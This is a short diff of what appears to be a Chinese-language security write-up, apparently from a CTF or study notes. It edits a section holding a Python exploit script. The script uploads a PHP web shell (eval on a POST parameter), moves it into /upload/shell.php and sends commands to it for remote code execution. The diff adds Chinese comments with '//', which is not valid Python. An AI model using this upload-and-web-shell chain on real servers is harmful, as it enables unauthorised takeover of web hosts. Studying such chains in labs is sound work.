@@ -354,7 +354,7 @@ mv [源文件] [目标路径]	**(使用方式)**
 
 
 
-### PAYLOAD：
+### 手敲PAYLOAD：
 
 ```
 import requests
@@ -367,17 +367,17 @@ def upload_file(filename, content):
     }
     post_data = {"upload": "1"}
     res = requests.post(url, files=post_file, data=post_data)
-    return res.text
+    return res.text	//定义上传的文件
 
 def move_file():
     post_data = {"confirm_move": "1"}
     res = requests.post(url, data=post_data)
-    return res.text
+    return res.text	//移动文件
 
 def rce(cmd):
     target_url = f"{url}/upload/shell.php"
     res = requests.post(target_url, data={"cmd": cmd})
-    return res.text
+    return res.text	//命令执行
 
 if __name__ == "__main__":
     shell_content = b"<?php eval($_POST['cmd']); ?>"
